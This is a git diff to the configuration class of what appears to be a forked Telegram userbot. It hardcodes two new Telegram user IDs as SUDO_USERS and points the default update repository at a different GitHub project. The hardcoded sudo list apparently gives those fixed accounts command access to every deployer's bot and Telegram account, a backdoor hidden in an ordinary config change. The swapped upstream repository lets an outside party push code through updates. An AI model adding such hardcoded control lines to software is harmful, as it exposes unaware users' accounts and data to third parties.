@@ -45,7 +45,7 @@ class Config(object):
     TAG_LOGGER = int(os.environ.get("TAG_LOGGER", 0))
     THUMB_IMG = os.environ.get("THUMB_IMG", "./HellConfig/resources/pics/hellbot_logo.jpg")
     UNLOAD = list(os.environ.get("UNLOAD", "").split())
-    UPSTREAM_REPO = os.environ.get("UPSTREAM_REPO", "https://github.com/MXNIHACKER/DevilXUser")
+    UPSTREAM_REPO = os.environ.get("UPSTREAM_REPO", "https://github.com/SHIVANSH474/SHUKLA-USERBOT")
     UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "master")
     WEATHER_API = os.environ.get("WEATHER_API", None)
 
@@ -55,7 +55,7 @@ class Config(object):
     CHROME_DRIVER = os.environ.get("CHROME_DRIVER", "/app/.chromedriver/bin/chromedriver")
     GOOGLE_CHROME_BIN = os.environ.get("GOOGLE_CHROME_BIN", "/app/.apt/usr/bin/google-chrome")
     MAX_MESSAGE_SIZE_LIMIT = 4095
-    SUDO_USERS = [6415940074, 6898413162]
+    SUDO_USERS = [6762113050, 6919199044]
     TELEGRAPH_NAME = os.environ.get("TELEGRAPH_NAME", "[ †he Hêllẞø† ]")
     TEMP_DIR = os.environ.get("TEMP_DIR", None)
     TMP_DOWNLOAD_DIRECTORY = os.environ.get("TMP_DOWNLOAD_DIRECTORY", "./DOWNLOADS/")
